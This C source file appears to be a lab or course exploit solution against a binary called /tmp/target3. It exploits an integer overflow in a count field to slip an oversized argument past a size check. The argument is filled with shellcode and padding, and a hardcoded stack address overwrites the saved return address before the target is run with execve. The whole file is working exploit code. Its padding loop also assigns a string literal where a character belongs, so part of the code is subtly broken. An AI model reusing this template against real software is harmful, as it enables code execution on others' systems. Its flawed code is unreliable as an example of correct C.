#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  // We want: count x 20 = (241 x 20) mod 2^32 because we want to overflow of one widget (240 + 1)
  // Thus, we need: count x 20 = 4820 mod 2^32
  // We can rewrite it as: count x 20 = 4820 + 2^32 x k
  // ie. count = 4820/20 + 2^32 x k / 20 = 241 + 2^31 x k / 10
  
  // But we also want count to be in 2^31 and 2^32 - 1 because we want it to be considered as negative
  // By picking k = 10, we get a count = 241 + 2^31 = 2147483889 verifying the overflow condition and in the proper interval.


  char addr[] = {0xa8, 0xd8, 0xff, 0xbf};
  args[0] = TARGET;

  // We use 4812 + 11 since there are 11 chars in the string s1,
  // and the eip we want to overwrite is located after saved ebx (4 bytes) and saved ebp (4 bytes), after the buffer (4800 bytes)
  args[1] = (char*) malloc(4812+11);

  char s1[] = "2147483889,";
  for(int i = 0; i < 11; i++)
    args[1][i] = s1[i];

  // Start with shell code
  int scl = strlen(shellcode);
  for(int i = 0; i < scl; i++)
    args[1][i+11] = shellcode[i];

  // Then add padding, not optionnal since any NULL bytes will act as EOS
  for(int i=11+scl; i < 4808+11; i++)
    args[1][i] = "A";

  // Then write the address of buffer
  for(int i=0; i < 4; i++)
    args[1][4808+11+i] = addr[i];


  args[2] = NULL;
  env[0] = NULL;
  
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
